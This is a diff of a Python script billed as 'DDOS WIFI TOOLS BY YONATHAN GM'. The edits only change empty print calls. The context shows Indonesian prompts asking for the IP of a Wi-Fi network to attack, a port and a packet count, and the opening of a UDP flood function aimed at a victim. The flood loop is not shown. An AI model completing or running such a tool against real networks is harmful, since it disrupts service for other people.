@@ -12,16 +12,16 @@ import optparse
 from turtle import clear
 #----------------------------------------------------------------------#
 def ddos():
-    print("")
+    print()
     print ("    ██████╗░██████╗░░█████╗░░██████╗")
     print ("    ██╔══██╗██╔══██╗██╔══██╗██╔════╝")
     print ("    ██║░░██║██║░░██║██║░░██║╚█████╗░")
     print ("    ██║░░██║██║░░██║██║░░██║░╚═══██╗")
     print ("    ██████╔╝██████╔╝╚█████╔╝██████╔╝")
     print ("    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░")
-    print ("")
+    print ()
     print ("MASUKAN IP DARI WIFI YANG ANDA INGIN SERANG")
-    print ("")
+    print ()
 #----------------------------------------------------------------------#
 def put():
     print("--------------------------------------------------------------------------")
@@ -34,11 +34,11 @@ print('''
   8888888P  8888888P   `8888P'   Y88888P         8888'   dP  dP        
 ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ''')
 
-    print("")
+    print()
     print("DDOS WIFI TOOLS BY YONATHAN GM")
     print("===================================")
     print("TYPE [gas] TO START THE PROGRAM ")
-    print("")
+    print()
     put=input("INPUT : ")
     
     if put == "gas":
@@ -47,11 +47,11 @@ ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ''')
         x = input("IP : ")
         print("-------------------------------------------------------------")
         print("MASUKAN PORT WIFI ANDA (CONTOH : 80)")
-        print("")
+        print()
         y = input("PORT : ")
         print("-------------------------------------------------------------")
         print("MASUKAN PAKET YANG ANDA KIRIM KE WIFI TUJUAN (MAXIMAL 1000)")
-        print("")
+        print()
         z = input("PACKET: ")
 
 import os
@@ -59,7 +59,7 @@ import sys
 
 #-------------------------------------------------------------#
 def usage():
-    print ("")
+    print ()
 #-------------------------------------------------------------#
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
